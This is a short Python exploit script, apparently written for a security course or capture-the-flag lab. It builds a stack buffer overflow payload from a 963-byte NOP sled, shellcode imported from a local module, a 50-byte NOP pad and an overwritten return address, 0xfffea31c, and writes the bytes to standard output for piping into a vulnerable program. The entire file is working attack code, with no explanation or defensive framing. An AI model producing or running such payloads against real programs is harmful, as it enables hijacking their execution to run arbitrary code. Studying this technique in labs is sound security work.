from struct import pack 
from shellcode import shellcode
import sys
padding = 963
padding1 = 50
inj = bytes.fromhex('90'*padding)+shellcode+bytes.fromhex('90'*padding1)+pack("<I", 0xfffea31c)#('\x12'*padding).encode('ASCII')
sys.stdout.buffer.write(inj)
